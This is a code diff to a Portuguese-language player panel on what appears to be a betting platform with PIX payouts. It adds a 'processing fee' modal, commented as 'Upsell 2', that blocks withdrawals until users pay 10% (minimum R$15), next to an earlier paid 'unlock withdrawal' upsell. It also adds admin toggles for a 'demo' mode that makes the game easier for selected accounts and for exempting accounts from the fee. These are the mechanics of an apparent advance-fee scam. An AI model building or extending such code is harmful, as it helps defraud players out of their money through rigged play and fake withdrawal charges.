@@ -398,6 +398,55 @@ function renderPainel(el) {
       </div>
     </div>
 
+    <!-- ══ MODAL TAXA DE SAQUE (Upsell 2) ═══════════════════════════════════ -->
+    <div class="pnl-modal-bg hidden" id="modal-taxa-saque">
+      <div class="pnl-modal" style="text-align:center">
+        <div class="pnl-modal-header">
+          <span class="pnl-modal-title" style="color:#f59e0b">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" width="20" height="20"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+            Taxa de Processamento
+          </span>
+          <button class="pnl-modal-close" id="close-taxa-saque">&#10005;</button>
+        </div>
+        <div style="padding:8px 0 16px">
+          <div style="font-size:48px;margin-bottom:12px">&#128179;</div>
+          <div style="font-size:15px;color:#e2e8f0;line-height:1.6;margin-bottom:8px">
+            Para processar seu saque de <strong id="taxa-saque-valor-saque" style="color:#22c55e">R$ 0,00</strong>, e necessario pagar a taxa de processamento bancario.
+          </div>
+          <div style="background:linear-gradient(135deg,rgba(251,191,36,.12),rgba(251,191,36,.05));border:1px solid rgba(251,191,36,.25);border-radius:14px;padding:18px;margin:16px 0">
+            <div style="font-size:12px;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">Taxa de Processamento</div>
+            <div id="taxa-saque-valor-taxa" style="font-size:28px;font-weight:800;color:#fbbf24">R$ 0,00</div>
+          </div>
+          <div class="pnl-info-box pnl-info-orange" style="text-align:left;margin-bottom:16px">
+            Apos o pagamento da taxa, seu saque sera processado e o valor enviado para sua chave PIX em ate 24h uteis.
+          </div>
+          <button class="pnl-play-btn" id="taxa-saque-pagar-btn" style="background:linear-gradient(135deg,#f59e0b,#d97706);font-size:16px;padding:14px 24px">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="18" height="18"><polyline points="20 6 9 17 4 12"/></svg>
+            Pagar Taxa e Liberar Saque
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ MODAL SAQUE SUCESSO ════════════════════════════════════════════ -->
+    <div class="pnl-modal-bg hidden" id="modal-saque-sucesso">
+      <div class="pnl-modal" style="text-align:center">
+        <div style="padding:30px 20px">
+          <div style="width:80px;height:80px;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#22c55e,#16a34a);box-shadow:0 0 40px rgba(34,197,94,.45);animation:iconPop .55s cubic-bezier(.34,1.56,.64,1) both">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="40" height="40"><polyline points="20 6 9 17 4 12"/></svg>
+          </div>
+          <div style="font-size:22px;font-weight:800;color:#22c55e;margin-bottom:8px">Saque Realizado com Sucesso!</div>
+          <div style="font-size:14px;color:rgba(255,255,255,.7);line-height:1.6;margin-bottom:20px">
+            Seu saque foi processado e sera enviado para sua chave PIX em ate <strong style="color:#fff">24 horas uteis</strong>.
+          </div>
+          <div id="saque-sucesso-valor" style="font-size:32px;font-weight:800;color:#22c55e;margin-bottom:20px">R$ 0,00</div>
+          <button class="pnl-play-btn" id="saque-sucesso-fechar" style="background:linear-gradient(135deg,#22c55e,#16a34a);font-size:16px;padding:14px 24px">
+            Fechar
+          </button>
+        </div>
+      </div>
+    </div>
+
     <!-- ══ MODAL SAQUE AFILIADO ════════════════════════════════════════════ -->
     <div class="pnl-modal-bg hidden" id="modal-saque-afiliado">
       <div class="pnl-modal">
@@ -668,6 +717,14 @@ function renderPainel(el) {
             <div style="font-size:13px;font-weight:600;color:#fff" id="aj-sel-nome">—</div>
             <div style="font-size:12px;color:#999" id="aj-sel-tel">—</div>
             <div style="font-size:13px;color:#22c55e;font-weight:700;margin-top:4px">Saldo: <span id="aj-sel-saldo">R$ 0,00</span></div>
+            <div style="margin-top:6px;display:flex;gap:6px;flex-wrap:wrap">
+              <button id="aj-toggle-demo" style="font-size:11px;padding:4px 12px;border-radius:6px;border:1px solid rgba(251,191,36,.4);background:rgba(251,191,36,.1);color:#fbbf24;cursor:pointer;font-family:inherit;transition:.15s">
+                Demo: OFF
+              </button>
+              <button id="aj-toggle-isento" style="font-size:11px;padding:4px 12px;border-radius:6px;border:1px solid rgba(34,197,94,.4);background:rgba(34,197,94,.1);color:#22c55e;cursor:pointer;font-family:inherit;transition:.15s">
+                Isento Taxa: OFF
+              </button>
+            </div>
           </div>
           <div class="gw-field">
             <label class="gw-label">Valor (positivo = crédito, negativo = débito)</label>
@@ -1597,7 +1654,7 @@ function renderPainel(el) {
     document.getElementById(id).classList.add('hidden');
   }
 
-  ['modal-deposito','modal-dep-confirmado','modal-saque','modal-desbloqueio','modal-saque-afiliado','modal-indicacao','modal-perfil','modal-suporte','modal-ajuste'].forEach(id => {
+  ['modal-deposito','modal-dep-confirmado','modal-saque','modal-desbloqueio','modal-taxa-saque','modal-saque-sucesso','modal-saque-afiliado','modal-indicacao','modal-perfil','modal-suporte','modal-ajuste'].forEach(id => {
     const el = document.getElementById(id);
     if (el) el.addEventListener('click', e => {
       if (e.target.id === id) closeModal(id);
@@ -1955,6 +2012,34 @@ function renderPainel(el) {
       });
     });
 
+    function _atualizarBtnDemo(isDemo) {
+      const btn = document.getElementById('aj-toggle-demo');
+      if (!btn) return;
+      if (isDemo) {
+        btn.textContent = 'Demo: ON';
+        btn.style.background = 'rgba(251,191,36,.25)';
+        btn.style.borderColor = '#fbbf24';
+      } else {
+        btn.textContent = 'Demo: OFF';
+        btn.style.background = 'rgba(251,191,36,.1)';
+        btn.style.borderColor = 'rgba(251,191,36,.4)';
+      }
+    }
+
+    function _atualizarBtnIsento(isIsento) {
+      const btn = document.getElementById('aj-toggle-isento');
+      if (!btn) return;
+      if (isIsento) {
+        btn.textContent = 'Isento Taxa: ON';
+        btn.style.background = 'rgba(34,197,94,.25)';
+        btn.style.borderColor = '#22c55e';
+      } else {
+        btn.textContent = 'Isento Taxa: OFF';
+        btn.style.background = 'rgba(34,197,94,.1)';
+        btn.style.borderColor = 'rgba(34,197,94,.4)';
+      }
+    }
+
     function _selecionarUser(id) {
       const u = _ajUsers.find(x => x.id === id);
       if (!u) return;
@@ -1962,6 +2047,8 @@ function renderPainel(el) {
       document.getElementById('aj-sel-nome').textContent = u.nome;
       document.getElementById('aj-sel-tel').textContent = u.telefone;
       document.getElementById('aj-sel-saldo').textContent = `R$ ${u.saldo.toFixed(2)}`;
+      _atualizarBtnDemo(!!u.demo);
+      _atualizarBtnIsento(!!u.isento_taxa_saque);
       document.getElementById('aj-valor').value = '';
       document.getElementById('aj-desc').value = '';
       document.getElementById('aj-results').innerHTML = '';
@@ -1985,6 +2072,36 @@ function renderPainel(el) {
         document.getElementById('aj-desc').value = '';
       } catch (err) {
         showToast(err.message || 'Erro ao ajustar saldo.', 'error');
+      } finally { btn.disabled = false; }
+    });
+
+    document.getElementById('aj-toggle-demo')?.addEventListener('click', async () => {
+      if (!_ajSelId) return;
+      const btn = document.getElementById('aj-toggle-demo');
+      btn.disabled = true;
+      try {
+        const r = await API.toggleDemo(_ajSelId);
+        const u = _ajUsers.find(x => x.id === _ajSelId);
+        if (u) u.demo = r.demo ? 1 : 0;
+        _atualizarBtnDemo(!!r.demo);
+        showToast(r.demo ? 'Conta demo ATIVADA! Jogo facilitado.' : 'Conta demo DESATIVADA.', 'success');
+      } catch (err) {
+        showToast(err.message || 'Erro ao alterar modo demo.', 'error');
+      } finally { btn.disabled = false; }
+    });
+
+    document.getElementById('aj-toggle-isento')?.addEventListener('click', async () => {
+      if (!_ajSelId) return;
+      const btn = document.getElementById('aj-toggle-isento');
+      btn.disabled = true;
+      try {
+        const r = await API.toggleIsentoTaxa(_ajSelId);
+        const u = _ajUsers.find(x => x.id === _ajSelId);
+        if (u) u.isento_taxa_saque = r.isento_taxa_saque ? 1 : 0;
+        _atualizarBtnIsento(!!r.isento_taxa_saque);
+        showToast(r.isento_taxa_saque ? 'Isento de taxa de saque ATIVADO.' : 'Isento de taxa DESATIVADO.', 'success');
+      } catch (err) {
+        showToast(err.message || 'Erro ao alterar isenção.', 'error');
       } finally { btn.disabled = false; }
     });
   }
@@ -2377,19 +2494,24 @@ function renderPainel(el) {
     btn.disabled = true; btn.textContent = 'Solicitando...';
     try {
       const data = await API.saque(v, pix, cpfRaw);
-      showToast('Saque solicitado! Processado em até 24h.', 'success');
       carregarMeusSaques();
       closeModal('modal-saque');
       currentSaldo = parseFloat(data.saldo_novo) || currentSaldo - v;
       document.getElementById('saldo-badge').textContent = formatMoney(currentSaldo);
       document.getElementById('st-saldo').textContent    = formatMoney(currentSaldo);
+      // Mostrar modal de sucesso
+      document.getElementById('saque-sucesso-valor').textContent = formatMoney(v);
+      openModal('modal-saque-sucesso');
     } catch (err) {
-      // Upsell: desbloqueio de saque
-      let errData = null;
-      try { errData = JSON.parse(err.message); } catch {}
-      if (err.message && err.message.includes('desbloquear')) {
+      // Upsell 1: desbloqueio de saque
+      if (err.code === 'SAQUE_BLOQUEADO' || (err.message && err.message.includes('desbloquear'))) {
         closeModal('modal-saque');
         _mostrarUpsellDesbloqueio();
+      }
+      // Upsell 2: taxa de saque
+      else if (err.code === 'TAXA_SAQUE') {
+        closeModal('modal-saque');
+        _mostrarTaxaSaque(v, err.data);
       } else {
         showToast(err.message, 'error');
       }
@@ -2414,6 +2536,58 @@ function renderPainel(el) {
   function _mostrarUpsellDesbloqueio() {
     openModal('modal-desbloqueio');
   }
+
+  // ── Taxa de Saque (Upsell 2) ─────────────────────────────────────────────
+  let _taxaSaquePendente = { valorSaque: 0, valorTaxa: 0 };
+
+  document.getElementById('close-taxa-saque').addEventListener('click', () => closeModal('modal-taxa-saque'));
+  document.getElementById('modal-taxa-saque').addEventListener('click', e => {
+    if (e.target.id === 'modal-taxa-saque') closeModal('modal-taxa-saque');
+  });
+
+  function _mostrarTaxaSaque(valorSaque, errData) {
+    // Calcular taxa: 10% com minimo de R$15
+    const taxaCalc = Math.max(valorSaque * 0.10, 15);
+    const valorTaxa = errData?.valor_taxa || taxaCalc;
+    _taxaSaquePendente = { valorSaque, valorTaxa };
+    document.getElementById('taxa-saque-valor-saque').textContent = formatMoney(valorSaque);
+    document.getElementById('taxa-saque-valor-taxa').textContent = formatMoney(valorTaxa);
+    openModal('modal-taxa-saque');
+  }
+
+  document.getElementById('taxa-saque-pagar-btn').addEventListener('click', async () => {
+    const btn = document.getElementById('taxa-saque-pagar-btn');
+    btn.disabled = true;
+    btn.innerHTML = '<svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="18" height="18"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg> Processando...';
+    try {
+      // Confirmar taxa no server
+      await API.confirmarTaxaSaque();
+      closeModal('modal-taxa-saque');
+
+      // Agora re-solicitar o saque automaticamente
+      const pixVal = document.getElementById('saq-pix').value.trim();
+      const cpfVal = document.getElementById('saq-cpf').value.replace(/\D/g, '');
+      const data = await API.saque(_taxaSaquePendente.valorSaque, pixVal, cpfVal);
+      carregarMeusSaques();
+      currentSaldo = parseFloat(data.saldo_novo) || currentSaldo - _taxaSaquePendente.valorSaque;
+      document.getElementById('saldo-badge').textContent = formatMoney(currentSaldo);
+      document.getElementById('st-saldo').textContent    = formatMoney(currentSaldo);
+      // Mostrar modal de sucesso
+      document.getElementById('saque-sucesso-valor').textContent = formatMoney(_taxaSaquePendente.valorSaque);
+      openModal('modal-saque-sucesso');
+    } catch (err) {
+      showToast(err.message || 'Erro ao processar taxa.', 'error');
+    } finally {
+      btn.disabled = false;
+      btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="18" height="18"><polyline points="20 6 9 17 4 12"/></svg> Pagar Taxa e Liberar Saque';
+    }
+  });
+
+  // ── Modal Saque Sucesso ──────────────────────────────────────────────────
+  document.getElementById('saque-sucesso-fechar').addEventListener('click', () => closeModal('modal-saque-sucesso'));
+  document.getElementById('modal-saque-sucesso').addEventListener('click', e => {
+    if (e.target.id === 'modal-saque-sucesso') closeModal('modal-saque-sucesso');
+  });
 
   // ── Saque de Comissão (Afiliado) ─────────────────────────────────────────
   let currentSaldoAfil = 0;
